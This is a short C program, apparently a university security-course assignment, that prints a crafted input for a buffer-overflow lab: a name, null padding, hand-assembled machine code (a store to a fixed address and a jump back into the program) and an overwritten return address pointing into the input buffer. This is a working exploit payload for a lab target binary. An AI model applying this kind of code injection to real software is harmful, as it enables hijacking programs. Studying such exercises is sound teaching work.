/*
 * createdata9.c
 * John Rambo
 * rambo@csd.uoc.gr
 * hy255
 * as6
 */

#include <stdio.h>

int main(void){
 int i;
 /* 0x006c05c6      0xe939080b      0xXXXXXXXX */
  fputs("Lazaros", stdout); /* 7 chars */
  for(i = 0; i < 11; i++)   /* 16 */
    putchar('\0');
  
  /* 0x080482d6 */
  
  putchar(0xc6);  /* movb $0x39,0x80b006c */
  putchar(0x05);
  putchar(0x6c);
  putchar(0x00);
  putchar(0x0b);
  putchar(0x08);
  putchar(0x39);
  
  putchar(0xe9);  /* jmp 0x80482d6 - offset calc*/
  putchar(0xe0);
  putchar(0x66);
  putchar(0xf9);
  putchar(0xff);
    
  /* 30 bytes so far */
  /* write i value buf[i++] should be buf[42] */
  putchar(41);   /* overwriten - goto retaddr */
  /* retaddr - inside Name */  
  putchar(0xea);
  putchar(0x1b);
  putchar(0x0b);
  putchar(0x08);
  /* Name */
  putchar(0xd8);
  putchar(0x1b);
  putchar(0x0b);
  putchar(0x08);
  
  putchar('\n');
  
  return 0;
}

